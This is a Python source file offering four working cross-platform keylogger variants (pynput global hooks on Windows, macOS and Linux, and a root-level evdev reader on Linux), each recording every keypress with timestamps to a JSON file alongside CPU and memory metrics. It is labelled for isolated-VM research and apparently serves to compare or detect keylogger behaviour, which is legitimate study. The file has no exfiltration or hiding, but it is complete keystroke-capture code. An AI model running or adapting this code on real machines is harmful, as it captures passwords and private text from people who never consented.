"""
Cross-Platform Keylogger Variants for Research
Works on Windows, macOS, and Linux
WARNING: Use ONLY in isolated VM environments for research purposes
"""

import time
import threading
import json
import platform
from datetime import datetime
from pynput import keyboard
import psutil
import os

# Try to import evdev for Linux support
try:
    from evdev import InputDevice, categorize, ecodes
    EVDEV_AVAILABLE = True
except ImportError:
    EVDEV_AVAILABLE = False

CURRENT_PLATFORM = platform.system()

# Add display debugging for Linux
if CURRENT_PLATFORM == "Linux":
    DISPLAY = os.environ.get('DISPLAY', 'Not set')
    print(f"[DEBUG] DISPLAY environment: {DISPLAY}")


# ============================================================================
# VARIANT 1: Global Hook (pynput - cross-platform)
# ============================================================================

class GlobalHookKeylogger:
    """Uses pynput global keyboard hook (works on all platforms)"""
    
    def __init__(self, output_file):
        """Initialize with output file path"""
        self.output_file = output_file
        self.is_running = False
        self.listener = None
        self.logs = {
            "variant": "global_hook",
            "keystrokes": [],
            "system_metrics": [],
            "start_time": None,
            "end_time": None
        }
    
    def on_press(self, key):
        """Callback when key is pressed"""
        try:
            self.logs["keystrokes"].append({
                "timestamp": time.time(),
                "key": str(key),
                "type": "press"
            })
        except Exception as e:
            pass
    
    def collect_metrics(self):
        """Collect system metrics while keylogger runs"""
        while self.is_running:
            try:
                metric = {
                    "timestamp": time.time(),
                    "cpu_percent": psutil.cpu_percent(interval=0.1),
                    "memory_mb": psutil.virtual_memory().used / 1024 / 1024,
                    "threads": threading.active_count(),
                    "handles": len(psutil.Process().open_files())
                }
                self.logs["system_metrics"].append(metric)
            except Exception as e:
                pass
            time.sleep(0.5)
    
    def start(self, duration_seconds=60):
        """Start keylogger for specified duration"""
        print(f"[Variant 1] Starting Global Hook Keylogger for {duration_seconds}s...")
        print(f"[Platform: {CURRENT_PLATFORM}]")
        self.is_running = True
        self.logs["start_time"] = datetime.now().isoformat()
        
        # Start metrics collection thread
        metrics_thread = threading.Thread(target=self.collect_metrics, daemon=True)
        metrics_thread.start()
        
        # Start keyboard listener
        listener_started = False
        try:
            self.listener = keyboard.Listener(on_press=self.on_press)
            self.listener.start()
            time.sleep(0.5)
            listener_started = True
            print("[Variant 1] Listener started successfully")
        except Exception as e:
            print(f"[Variant 1] Error starting listener: {e}")
        
        try:
            time.sleep(duration_seconds)
        except KeyboardInterrupt:
            pass
        finally:
            self.stop()
            if listener_started:
                metrics_thread.join(timeout=2)
    
    def stop(self):
        """Stop keylogger and save data"""
        self.is_running = False
        if self.listener:
            self.listener.stop()
        self.logs["end_time"] = datetime.now().isoformat()
        
        # Save to file
        os.makedirs(os.path.dirname(self.output_file), exist_ok=True)
        with open(self.output_file, 'w') as f:
            json.dump(self.logs, f, indent=2)
        
        print(f"[Variant 1] Logged {len(self.logs['keystrokes'])} keystrokes to {self.output_file}")


# ============================================================================
# VARIANT 2: Polling Method (pynput with simulated polling)
# ============================================================================

class PollingKeylogger:
    """Polling-based keylogger with platform adaptation"""
    
    def __init__(self, output_file):
        """Initialize with output file path"""
        self.output_file = output_file
        self.is_running = False
        self.listener = None
        self.logs = {
            "variant": "polling",
            "keystrokes": [],
            "system_metrics": [],
            "start_time": None,
            "end_time": None
        }
    
    def on_press(self, key):
        """Callback when key is pressed"""
        try:
            self.logs["keystrokes"].append({
                "timestamp": time.time(),
                "key": str(key),
                "type": "press"
            })
        except Exception as e:
            pass
    
    def on_release(self, key):
        """Callback when key is released"""
        pass
    
    def collect_metrics(self):
        """Collect system metrics while keylogger runs"""
        while self.is_running:
            try:
                metric = {
                    "timestamp": time.time(),
                    "cpu_percent": psutil.cpu_percent(interval=0.1),
                    "memory_mb": psutil.virtual_memory().used / 1024 / 1024,
                    "threads": threading.active_count(),
                    "handles": len(psutil.Process().open_files())
                }
                self.logs["system_metrics"].append(metric)
            except Exception as e:
                pass
            time.sleep(0.5)
    
    def start(self, duration_seconds=60):
        """Start keylogger for specified duration"""
        print(f"[Variant 2] Starting Polling Keylogger for {duration_seconds}s...")
        print(f"[Platform: {CURRENT_PLATFORM}]")
        print("[Note: Using pynput-based polling simulation for cross-platform compatibility]")
        
        self.is_running = True
        self.logs["start_time"] = datetime.now().isoformat()
        
        # Start metrics thread
        metrics_thread = threading.Thread(target=self.collect_metrics, daemon=True)
        metrics_thread.start()
        
        # Start listener
        listener_started = False
        try:
            self.listener = keyboard.Listener(
                on_press=self.on_press,
                on_release=self.on_release
            )
            self.listener.start()
            time.sleep(0.5)
            listener_started = True
            print("[Variant 2] Listener started successfully")
        except Exception as e:
            print(f"[Variant 2] Error starting listener: {e}")
        
        try:
            time.sleep(duration_seconds)
        except KeyboardInterrupt:
            pass
        finally:
            self.stop()
            if listener_started:
                metrics_thread.join(timeout=2)
    
    def stop(self):
        """Stop keylogger and save data"""
        self.is_running = False
        if self.listener:
            self.listener.stop()
        self.logs["end_time"] = datetime.now().isoformat()
        
        # Save to file
        os.makedirs(os.path.dirname(self.output_file), exist_ok=True)
        with open(self.output_file, 'w') as f:
            json.dump(self.logs, f, indent=2)
        
        print(f"[Variant 2] Logged {len(self.logs['keystrokes'])} keystrokes to {self.output_file}")


# ============================================================================
# VARIANT 3: Simple Hook (Simplified implementation)
# ============================================================================

class SimpleHookKeylogger:
    """Simplified keyboard hook for comparison"""
    
    def __init__(self, output_file):
        """Initialize with output file path"""
        self.output_file = output_file
        self.is_running = False
        self.listener = None
        self.logs = {
            "variant": "simple_hook",
            "keystrokes": [],
            "system_metrics": [],
            "start_time": None,
            "end_time": None
        }
    
    def on_press(self, key):
        """Callback when key is pressed"""
        try:
            self.logs["keystrokes"].append({
                "timestamp": time.time(),
                "key": str(key),
                "type": "press"
            })
        except Exception as e:
            pass
    
    def collect_metrics(self):
        """Collect system metrics while keylogger runs"""
        while self.is_running:
            try:
                metric = {
                    "timestamp": time.time(),
                    "cpu_percent": psutil.cpu_percent(interval=0.1),
                    "memory_mb": psutil.virtual_memory().used / 1024 / 1024,
                    "threads": threading.active_count(),
                    "handles": len(psutil.Process().open_files())
                }
                self.logs["system_metrics"].append(metric)
            except Exception as e:
                pass
            time.sleep(0.5)
    
    def start(self, duration_seconds=60):
        """Start keylogger for specified duration"""
        print(f"[Variant 3] Starting Simple Hook Keylogger for {duration_seconds}s...")
        print(f"[Platform: {CURRENT_PLATFORM}]")
        self.is_running = True
        self.logs["start_time"] = datetime.now().isoformat()
        
        # Start metrics collection
        metrics_thread = threading.Thread(target=self.collect_metrics, daemon=True)
        metrics_thread.start()
        
        # Start keyboard listener
        listener_started = False
        try:
            self.listener = keyboard.Listener(on_press=self.on_press)
            self.listener.start()
            time.sleep(0.5)
            listener_started = True
            print("[Variant 3] Listener started successfully")
        except Exception as e:
            print(f"[Variant 3] Error starting listener: {e}")
        
        try:
            time.sleep(duration_seconds)
        except KeyboardInterrupt:
            pass
        finally:
            self.stop()
            if listener_started:
                metrics_thread.join(timeout=2)
    
    def stop(self):
        """Stop keylogger and save data"""
        self.is_running = False
        if self.listener:
            self.listener.stop()
        self.logs["end_time"] = datetime.now().isoformat()
        
        # Save to file
        os.makedirs(os.path.dirname(self.output_file), exist_ok=True)
        with open(self.output_file, 'w') as f:
            json.dump(self.logs, f, indent=2)
        
        print(f"[Variant 3] Logged {len(self.logs['keystrokes'])} keystrokes to {self.output_file}")


# ============================================================================
# VARIANT 4: EVDEV (Linux-only, direct device access - REQUIRES SUDO)
# ============================================================================

class EvdevKeylogger:
    """Uses evdev to capture keystrokes directly from input devices (Linux only)"""
    
    def __init__(self, output_file):
        """Initialize with output file path"""
        self.output_file = output_file
        self.is_running = False
        self.logs = {
            "variant": "evdev",
            "keystrokes": [],
            "system_metrics": [],
            "start_time": None,
            "end_time": None
        }
        self.device = None
    
    def find_keyboard_device(self):
        """Find keyboard input device"""
        if not EVDEV_AVAILABLE:
            print("[ERROR] evdev not installed. Run: pip install evdev")
            return None
        
        try:
            devices = [InputDevice(path) for path in os.listdir('/dev/input') 
                       if path.startswith('event')]
            
            # First try: find explicitly named keyboard device
            for device in devices:
                if 'keyboard' in device.name.lower() or 'kbd' in device.name.lower():
                    return device
            
            # Fallback: return first device with keyboard capability
            for device in devices:
                if ecodes.EV_KEY in device.capabilities():
                    return device
        except PermissionError:
            print("[ERROR] Permission denied accessing /dev/input")
            print("[INFO] Run with: sudo python master_system.py")
        except Exception as e:
            print(f"[Evdev] Error finding device: {e}")
        return None
    
    def collect_metrics(self):
        """Collect system metrics while keylogger runs"""
        while self.is_running:
            try:
                metric = {
                    "timestamp": time.time(),
                    "cpu_percent": psutil.cpu_percent(interval=0.1),
                    "memory_mb": psutil.virtual_memory().used / 1024 / 1024,
                    "threads": threading.active_count(),
                    "handles": len(psutil.Process().open_files())
                }
                self.logs["system_metrics"].append(metric)
            except Exception as e:
                pass
            time.sleep(0.5)
    
    def start(self, duration_seconds=60):
        """Start capturing keystrokes"""
        if not EVDEV_AVAILABLE:
            print("[Variant 4] evdev not installed. Install with: pip install evdev")
            return
        
        print(f"[Variant 4] Starting Evdev Keylogger for {duration_seconds}s...")
        print(f"[Platform: {CURRENT_PLATFORM}]")
        print("[Note: Direct device access - Linux only, requires root/sudo]")
        
        self.device = self.find_keyboard_device()
        if not self.device:
            print("[ERROR] No keyboard device found!")
            print("[INFO] Run with: sudo python master_system.py")
            return
        
        print(f"[✓] Using device: {self.device.name}")
        self.is_running = True
        self.logs["start_time"] = datetime.now().isoformat()
        
        # Start metrics collection thread
        metrics_thread = threading.Thread(target=self.collect_metrics, daemon=True)
        metrics_thread.start()
        
        start_time = time.time()
        try:
            for event in self.device.read_loop():
                if not self.is_running:
                    break
                
                # Only capture key press events
                if event.type == ecodes.EV_KEY and event.value == 1:
                    self.logs["keystrokes"].append({
                        "timestamp": time.time(),
                        "key": str(event.code),
                        "type": "press"
                    })
                
                # Check if duration exceeded
                if time.time() - start_time > duration_seconds:
                    break
        
        except PermissionError:
            print("[ERROR] Permission denied. Run with: sudo python master_system.py")
        except Exception as e:
            print(f"[Variant 4] Error: {e}")
        finally:
            self.stop()
            metrics_thread.join(timeout=2)
    
    def stop(self):
        """Stop and save"""
        self.is_running = False
        self.logs["end_time"] = datetime.now().isoformat()
        
        os.makedirs(os.path.dirname(self.output_file), exist_ok=True)
        with open(self.output_file, 'w') as f:
            json.dump(self.logs, f, indent=2)
        
        print(f"[Variant 4] Logged {len(self.logs['keystrokes'])} keystrokes to {self.output_file}")